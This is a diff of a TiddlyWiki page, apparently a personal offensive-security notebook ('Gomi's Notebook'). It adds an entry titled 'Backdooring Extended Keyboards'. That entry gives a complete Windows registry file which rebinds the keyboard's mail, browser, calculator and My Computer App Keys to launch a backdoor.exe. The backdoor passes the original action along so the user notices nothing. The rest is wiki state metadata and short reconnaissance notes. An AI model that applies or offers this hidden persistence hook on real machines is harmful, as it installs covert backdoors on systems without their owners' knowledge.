@@ -153,6 +153,8 @@ Error message and password prompt
 
 <li>Admin Interfaces</li>
 
+<li>Backdooring Extended Keyboards</li>
+
 <li>Command and Control (C2)</li>
 
 <li>Computer Network Attack</li>
@@ -184,6 +186,8 @@ Error message and password prompt
 <li>OpenVPN Management Port</li>
 
 <li>Reconnaissance</li>
+
+<li>Under Construction</li>
 
 <li>Vhost enumeration through HTTPS</li>
 
@@ -3939,11 +3943,12 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20150507032518156" modified="20150507033006551" title="$:/DefaultTiddlers">
-<pre>[[Computer Network Attack]]
+<div created="20150507032518156" modified="20150507161816131" title="$:/DefaultTiddlers">
+<pre>[[Under Construction]]
+[[Computer Network Attack]]
 [[Latest Entries]]</pre>
 </div>
-<div current-tiddler="Discovery (Invasive Recon)" modified="20150507043321780" title="$:/HistoryList" type="application/json">
+<div current-tiddler="Under Construction" modified="20150507162705648" title="$:/HistoryList" type="application/json">
 <pre>[
     {
         &quot;title&quot;: &quot;GettingStarted&quot;
@@ -4516,6 +4521,49 @@ Error message and password prompt
     },
     {
         &quot;title&quot;: &quot;Discovery (Invasive Recon)&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Computer Network Attack&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Draft of 'New Tiddler'&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Under Construction&quot;
+    },
+    {
+        &quot;title&quot;: &quot;$:/ControlPanel&quot;,
+        &quot;fromPageRect&quot;: {
+            &quot;top&quot;: 144,
+            &quot;left&quot;: 799.328125,
+            &quot;width&quot;: 29.328125,
+            &quot;right&quot;: 828.65625,
+            &quot;bottom&quot;: 171,
+            &quot;height&quot;: 27
+        }
+    },
+    {
+        &quot;title&quot;: &quot;Draft of 'New Tiddler'&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Computer Network Attack (Full)&quot;,
+        &quot;fromPageRect&quot;: {
+            &quot;top&quot;: 699,
+            &quot;left&quot;: 351.109375,
+            &quot;width&quot;: 135.1533203125,
+            &quot;right&quot;: 486.2626953125,
+            &quot;bottom&quot;: 715,
+            &quot;height&quot;: 16
+        }
+    },
+    {
+        &quot;title&quot;: &quot;Backdooring Extended Keyboards&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Draft of 'Under Construction'&quot;
+    },
+    {
+        &quot;title&quot;: &quot;Under Construction&quot;
     }
 ]</pre>
 </div>
@@ -4540,19 +4588,19 @@ Error message and password prompt
 <div created="20150507032458266" modified="20150507032502164" title="$:/SiteTitle">
 <pre>Gomi's Notebook</pre>
 </div>
-<div modified="20150507042329914" title="$:/state/showeditpreview">
-<pre>yes</pre>
+<div modified="20150507162703056" title="$:/state/showeditpreview">
+<pre>no</pre>
 </div>
-<div modified="20150507043354695" title="$:/state/sidebar">
+<div modified="20150507162556434" title="$:/state/sidebar">
 <pre>yes</pre>
 </div>
 <div modified="20150507033155462" title="$:/state/tab/sidebar-{312696086}">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="[[Computer Network Attack]] [[Computer Network Attack (Full)]] [[Latest Entries]]" title="$:/StoryList">
+<div list="[[Under Construction]] [[Computer Network Attack]] [[Latest Entries]]" title="$:/StoryList">
 <pre></pre>
 </div>
-<div created="20150507021425190" modified="20150507025039299" title="$:/temp/NewTagName">
+<div created="20150507021425190" modified="20150507162253394" title="$:/temp/NewTagName">
 <pre></pre>
 </div>
 <div created="20150507025354228" modified="20150507025357438" title="$:/temp/search">
@@ -4616,6 +4664,35 @@ Only now, after progressing through the first six phases, can intruders take act
 <pre>https://www.youtube.com/watch?v=u68QvWXYW_Q
 
 Script that processes nmap results, checks for HTTP, outputs html, have peepingtom scrap results, look for admin login prompts</pre>
+</div>
+<div created="20150507161821949" modified="20150507162550003" tags="Persistance [[Original Research]]" title="Backdooring Extended Keyboards">
+<pre>Extended keys to launch mail, web, and even calculator are &quot;App Keys&quot; [[source|http://www.experts-exchange.com/articles/2155/Keyboard-Remapping-CAPSLOCK-to-Ctrl-and-Beyond.html]]
+
+The following regedit file hooks our backdoor into these APP Keys and pass the original intent as arguments for our backdoor to launch so the user doesn't notice anything.
+
+```
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\15]
+&quot;Association&quot;=-
+&quot;ShellExecute&quot;=&quot;backdoor.exe Association mailto&quot;
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\16]
+&quot;Association&quot;=-
+&quot;ShellExecute&quot;=&quot;backdoor.exe Association .cda&quot;
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\17]
+&quot;ShellExecute&quot;=&quot;backdoor.exe ShellExecute ::{20D04FE0-3AEA-1069-A2D8-08002B30309D}&quot;
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18]
+&quot;ShellExecute&quot;=&quot;backdoor.exe ShellExecute calc.exe&quot;
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\7]
+&quot;Association&quot;=-
+&quot;ShellExecute&quot;=&quot;backdoor.exe Association http&quot;
+```</pre>
 </div>
 <div created="20150507031648638" modified="20150507031757327" tags="CNA" title="Command and Control (C2)">
 <pre>&lt;&lt;&lt;
@@ -4857,6 +4934,9 @@ Research, identification and selection of targets, often represented as crawling
 
 * [[Footprinting (Non-Invasive Recon)]]
 * [[Discovery (Invasive Recon)]]</pre>
+</div>
+<div created="20150507161455977" modified="20150507161758973" title="Under Construction">
+<pre>This is replacing http://gomi.crimsonagents.com/ But not all of the information has been moved over yet.</pre>
 </div>
 <div created="20150507024234426" modified="20150507024441844" tags="Discovery [[Original Research]]" title="Vhost enumeration through HTTPS">
 <pre>Connect to HTTPS port 443 using the IP address of the server. Examine the certificate used to potentially determine another vhosts on the server.</pre>
